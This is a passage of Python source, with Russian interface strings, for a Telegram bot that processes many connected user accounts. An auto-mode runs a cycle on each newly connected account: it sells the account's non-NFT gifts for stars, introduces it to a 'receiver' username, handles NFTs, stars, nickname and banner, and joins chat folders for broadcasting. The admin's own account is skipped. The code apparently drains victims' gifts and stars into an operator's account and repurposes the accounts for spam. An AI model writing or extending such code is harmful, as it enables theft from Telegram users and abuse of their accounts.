                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
                continue
            prog = self._throttled(lambda t, p=prefix: reply(p + t))
            try:
                sold, gained = self._sell_non_nft_gifts(slot, report=prog)
                reply(f"{prefix}✅ продано {sold}, получено {gained} ⭐")
            except Exception as e:
                reply(f"{prefix}❌ {e}")
        reply("🏁 Продажа завершена")

    def _action_pipeline(self, slots, reply):
        reply("🚀 Полный цикл: знакомство → продажа → NFT → звёзды → ник")
        for acc in slots:
            slot = acc["slot"]
            prefix = f"<b>#{slot} {acc['name']}</b>: "
            if self._is_admin(acc["user_id"]):
                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
                continue
            prog = self._throttled(lambda t, p=prefix: reply(p + t))
            try:
                self._run_pipeline(slot, prog)
                reply(f"{prefix}🏁 цикл завершён")
            except Exception as e:
                reply(f"{prefix}❌ {e}")
        reply("🏁 Полный цикл завершён")

    def _action_know(self, slots, reply):
        if not self._target_username():
            reply("Сначала задайте username приёмника: "
                  "<code>/settargetusername &lt;username&gt;</code>")
            return
        done = failed = 0
        for acc in slots:
            slot = acc["slot"]
            try:
                ok, info = self._know_target(slot)
                if ok:
                    done += 1
                else:
                    failed += 1
                reply(f"<b>#{slot}</b>: {info}")
            except Exception as e:
                failed += 1
                reply(f"❌ #{slot}: {e}")
            time.sleep(1.0)
        reply(f"✅ Знакомство: успешно {done}"
              + (f", ошибок {failed}" if failed else ""))

    def _input_peer_from_chat(self, chat):
        """InputPeer из объекта Chat/Channel (канал -> inputPeerChannel,
        обычная группа -> inputPeerChat)."""
        cid = int(getattr(chat, "id", 0) or 0)
        name = type(chat).__name__.lower()
        if "channel" in name:
            peer = self._tl_class("TL_inputPeerChannel", "inputPeerChannel")()
            peer.channel_id = cid
            peer.access_hash = int(getattr(chat, "access_hash", 0) or 0)
            return peer
        peer = self._tl_class("TL_inputPeerChat", "inputPeerChat")()
        peer.chat_id = cid
        return peer

    def _chatlist_input_peers(self, invite):
        """InputPeer'ы чатов, в которые нужно вступить, из ChatlistInvite.
        Для chatlistInviteAlready берём только missing_peers."""
        chats = self._tl_list(getattr(invite, "chats", None))
        by_id = {}
        for ch in chats:
            by_id[int(getattr(ch, "id", 0) or 0)] = ch
        target_ids = None
        missing = self._tl_list(getattr(invite, "missing_peers", None))
        if missing:
            target_ids = set()
            for pr in missing:
                cid = (getattr(pr, "channel_id", None)
                       or getattr(pr, "chat_id", None)
                       or getattr(pr, "user_id", None))
                if cid is not None:
                    target_ids.add(int(cid))
        peers = []
        for cid, ch in by_id.items():
            if target_ids is not None and cid not in target_ids:
                continue
            peers.append(self._input_peer_from_chat(ch))
        return peers

    def _join_chatlist(self, account, report):
        """Вступает в папку чатов по addlist-ссылке.
        Возвращает список (chat, id, title) для рассылки."""
        slug = self._broadcast_slug()
        if not slug:
            report("Ссылка на папку не задана (/setaddlist <url>)")
            return []
        if not self._tl_has("TL_chatlists_checkChatlistInvite",
                            "checkChatlistInvite"):
            report("В сборке клиента нет chatlists.checkChatlistInvite")
            return []
        if not self._tl_has("TL_chatlists_joinChatlistInvite",
                            "joinChatlistInvite"):
            report("В сборке клиента нет chatlists.joinChatlistInvite")
            return []
        check = self._tl_class("TL_chatlists_checkChatlistInvite",
                               "checkChatlistInvite")()
        check.slug = slug
        invite = self._tl(check, account)
        if invite is None:
            report("checkChatlistInvite вернул пусто")
            return []
        peers = self._chatlist_input_peers(invite)
        chats = self._tl_list(getattr(invite, "chats", None))
        result = []
        for ch in chats:
            cid = int(getattr(ch, "id", 0) or 0)
            if cid:
                result.append((ch, cid, str(getattr(ch, "title", "") or "")))
        if peers:
            join = self._tl_class("TL_chatlists_joinChatlistInvite",
                                  "joinChatlistInvite")()
            join.slug = slug
            join.peers = self._to_vector(peers)
            self._tl(join, account)
            report(f"📂 Вступление в папку: чатов {len(result)}")
        else:
            report("📂 Нет новых чатов для вступления (уже в папке?)")
        return result

    def _auto_on_new_account(self, slot):
        """Авто-режим: полный цикл по только что подключённому аккаунту."""
        accounts = {a["slot"]: a for a in self._scan_accounts()}
        acc = accounts.get(slot)
        prefix = f"<b>#{slot}</b> "
        if acc and self._is_admin(acc["user_id"]):
            self._send_log(prefix + "⏭ авто-режим: аккаунт админа пропущен")
            return
        self._send_log(prefix + "🤖 авто-режим: запуск полного цикла")
        prog = self._throttled(lambda t, p=prefix: self._send_log(p + t))
        try:
            self._run_pipeline(slot, prog)
            self._send_log(prefix + "🏁 авто-режим: цикл завершён")
        except Exception as e:
            self._send_log(prefix + f"❌ авто-режим: {e}")


    def _cmd_sell(self, args, reply):
        slot = None
        if args and args[0].lstrip("-").isdigit():
            slot = int(args[0])
            args = args[1:]
        if not args or args[0].lower() != "confirm":
            reply("⚠️ Продаст <b>все не-NFT подарки</b> аккаунтов и превратит их "
                  "в звёзды (convertStarGift). NFT не трогает. Продолжить: "
                  "<code>/sell confirm</code>")
            return
        self._action_sell(self._resolve_slots(slot), reply)

    def _cmd_auto(self, args, reply):
        """Управление авто-режимом: on/off/run."""
        sub = (args[0].lower() if args else "")
        if sub in ("on", "вкл", "1"):
            self.set_setting("auto_mode", "1")
            reply("🟢 Авто-режим <b>включён</b>. Новые аккаунты будут "
                  "обработаны полным циклом (продажа → NFT → звёзды → ник → "
                  "баннер).")
        elif sub in ("off", "выкл", "0"):
            self.set_setting("auto_mode", "0")
            reply("🔴 Авто-режим <b>выключен</b>.")
        elif sub == "run":
            slot = None
            if len(args) > 1 and args[1].lstrip("-").isdigit():
                slot = int(args[1])
            self._action_pipeline(self._resolve_slots(slot), reply)
        else:
            state = "🟢 ВКЛ" if self._auto_enabled() else "🔴 ВЫКЛ"
            reply(f"Авто-режим: {state}\n"
                  "<code>/auto on</code> — включить\n"
                  "<code>/auto off</code> — выключить\n"
                  "<code>/auto run [слот]</code> — запустить цикл сейчас")

